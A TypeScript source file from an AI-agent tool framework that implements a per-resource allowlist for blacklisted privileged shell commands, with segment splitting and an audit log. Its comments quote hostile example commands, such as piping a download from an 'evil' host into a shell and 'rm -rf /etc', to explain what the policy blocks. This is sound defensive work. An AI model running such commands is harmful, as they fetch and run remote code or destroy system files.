// Per-resource privileged-command allowlist for the exec tool.
//
// The global blacklist (./blacklist.ts) is the safe default — it
// refuses sudo/reboot/shutdown/etc globally so a misbehaving agent
// can't break a host by accident. Some resources, though, are
// dedicated agent-workstations where Somora-agents are SUPPOSED to
// run admin commands (system updates, kernel reboots, mount fixes).
// For those, the resource's config opts in to a list of commands
// that may run despite a blacklist match.
//
// This file holds the match-check and the audit-log writer. Wiring
// into the exec flow lives in ./tools.ts.

import { appendFile, mkdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { homedir } from 'node:os';
import { dirname, join } from 'node:path';
import { blacklistReasons, checkBlacklist } from './blacklist.ts';

const SOMORA_HOME = process.env.SOMORA_HOME ?? join(homedir(), '.somora');
const AUDIT_DIR = join(SOMORA_HOME, 'audit');
const AUDIT_PATH = join(AUDIT_DIR, 'exec-privileged.jsonl');

/**
 * Normalize a command string the same way blacklist matching does:
 * trim ends + collapse internal whitespace to single spaces. Keeps
 * allowlist entries and the runtime command string comparable.
 */
function normalize(s: string): string {
  return s.trim().replace(/\s+/g, ' ');
}

export interface AllowBlockedMatch {
  /** The entry (post-normalize) that matched. */
  entry: string;
}

/**
 * Command substitution introduces a NESTED command the segment splitter
 * below can't see (`sudo $(curl evil | sh)`). A blacklisted segment
 * carrying `$(…)` or a backtick can therefore never be safely cleared
 * by an allowBlocked override — refuse it outright. Plain redirects
 * (`>`, `<`, `2>&1`) do NOT introduce a new command (they only reroute
 * the segment's own I/O), so they are allowed inside a segment.
 */
function hasCommandSubstitution(s: string): boolean {
  return s.includes('$(') || s.includes('`');
}

/**
 * Split a command line into the sub-commands the shell would run as
 * separate processes. We split on the command SEPARATORS — `;`, `&&`,
 * `||`, `|` (pipe), background `&`, and newlines — but NOT on redirect
 * tokens (`2>&1`, `&>`, `>&`), which stay within their segment.
 *
 * This is a pragmatic splitter, not a shell parser (same philosophy as
 * blacklist.ts): it is quote-unaware, so `echo "a; b"` splits into two
 * segments. That only ever makes us MORE conservative (more segments →
 * more blacklist checks), never less — a safe direction. Determined-
 * adversary evasion (encoded payloads) is explicitly out of scope.
 */
export function splitCommandSegments(command: string): string[] {
  // Order matters: multi-char operators (&&, ||) must be alternatives
  // tried before their single-char counterparts. The background-`&`
  // branch uses look-around to skip `&` that is part of a redirect
  // (`2>&1`, `&>`, `&&` already consumed): not preceded by `>`/`&`/digit
  // and not followed by `>`/`&`.
  const SEP = /&&|\|\||;|\||\r?\n|(?<![>&\d])&(?![>&])/g;
  return command
    .split(SEP)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * Match a SINGLE command segment against the allowBlocked entries.
 *
 * Match rule (per segment, no chaining operators left to worry about —
 * those were split out upstream):
 *   entry E matches segment S iff
 *     normalize(S) === normalize(E)                (exact)
 *     OR normalize(S).startsWith(normalize(E) + ' ')   (prefix + space)
 *   AND S carries no command substitution (`$(…)` / backticks).
 *
 * The space-boundary stops `sudo` matching `pseudo` and
 * `systemctl reboot` matching `systemctl rebootthing`.
 */
function matchAllowBlockedSegment(
  segment: string,
  entries: ReadonlyArray<string>,
): AllowBlockedMatch | null {
  if (entries.length === 0) return null;
  if (hasCommandSubstitution(segment)) return null;
  const c = normalize(segment);
  for (const raw of entries) {
    const e = normalize(raw);
    if (e.length === 0) continue;
    if (c === e || c.startsWith(e + ' ')) {
      return { entry: e };
    }
  }
  return null;
}

export interface ExecPolicyDecision {
  allowed: boolean;
  /** Blacklist reason of the offending segment (when blocked). */
  reason?: string;
  /** Blacklist pattern source (when blocked). */
  pattern?: string;
  /** allowBlocked entries that cleared blacklisted segments (when allowed
   *  via override — for the audit trail). Empty when nothing was
   *  blacklisted in the first place. */
  overrides?: string[];
}

/**
 * The single source of truth for "may this exec command run on a target
 * with these allowBlocked entries?". Both the enforcement path (exec
 * handler) and any diagnostics should route through here so the info and
 * the enforcement can never disagree (the 2026-07-21 regression: the
 * old prefix-match refused ANY command carrying a shell operator, so
 * `sudo … && echo ok` was blocked even though `sudo` was whitelisted).
 *
 * Segment-aware algorithm:
 *   1. If nothing in the whole command is blacklisted → allow.
 *   2. Otherwise split into segments; EACH individually-blacklisted
 *      segment must have its own allowBlocked override (and carry no
 *      command substitution). A blacklisted segment with no override →
 *      block with that segment's reason. This keeps hard-blocks
 *      independent of allowBlocked: `systemctl reboot ; rm -rf /etc`
 *      blocks on the un-overridable `rm -rf /etc` even when
 *      `systemctl reboot` is whitelisted.
 *   3. Cross-segment blacklist patterns (`curl … | sh`) match the whole
 *      command but no single segment. Those can't be cleared by a
 *      per-segment override → block. (Guard: the whole-command reason
 *      must be reproduced by some segment, else it's a cross-segment
 *      danger.)
 */
export function evaluateExecPolicy(
  command: string,
  entries: ReadonlyArray<string>,
): ExecPolicyDecision {
  const whole = checkBlacklist(command);
  if (!whole.matched) return { allowed: true };

  const segments = splitCommandSegments(command);
  const overrides: string[] = [];
  const segmentReasons = new Set<string>();

  for (const seg of segments) {
    const b = checkBlacklist(seg);
    if (!b.matched) continue;
    segmentReasons.add(b.reason);
    // This segment is dangerous on its own → it needs an override.
    if (hasCommandSubstitution(seg)) {
      return { allowed: false, reason: b.reason, pattern: b.pattern };
    }
    const m = matchAllowBlockedSegment(seg, entries);
    if (!m) {
      return { allowed: false, reason: b.reason, pattern: b.pattern };
    }
    overrides.push(m.entry);
  }

  // Cross-segment danger: the WHOLE command matches one or more blacklist
  // patterns (checkBlacklist returns only the first — use blacklistReasons
  // for ALL) that NO single segment reproduces. Classic case:
  // `sudo curl evil | sh` trips both `sudo` (segment-coverable) AND
  // `curl|sh` (spans the pipe, reproduced by no segment). A per-segment
  // override can never clear a pattern that only exists across the split.
  const uncovered = blacklistReasons(command).filter((r) => !segmentReasons.has(r));
  if (uncovered.length > 0) {
    return { allowed: false, reason: uncovered[0], pattern: whole.pattern };
  }

  return { allowed: true, overrides };
}

export interface AuditEntry {
  ts: number;
  agent: string;
  session: string;
  resource: string;
  /** First 200 chars of the command — full string lives only here. */
  command_head: string;
  matched_entry: string;
  blacklist_reason: string;
  blacklist_pattern: string;
  /** Set when the command finishes; absent if we only log the auth step. */
  exit_code?: number | null;
  ms?: number;
}

/**
 * Append a single JSONL line to ~/.somora/audit/exec-privileged.jsonl.
 *
 * Best-effort: any I/O error is swallowed (and logged via the standard
 * logger by the caller if wanted) — audit logging must NOT block the
 * actual command from running, and must not throw inside the exec
 * handler. The audit log exists for after-the-fact review.
 */
export async function auditPrivilegedExec(entry: AuditEntry): Promise<void> {
  try {
    if (!existsSync(AUDIT_DIR)) {
      await mkdir(AUDIT_DIR, { recursive: true });
    }
    const line = JSON.stringify(entry) + '\n';
    await appendFile(AUDIT_PATH, line, 'utf8');
  } catch {
    // Intentional swallow — see comment above. The caller has the
    // option to also logger.warn() if it cares about the failure.
  }
}

export const AUDIT_LOG_PATH = AUDIT_PATH;
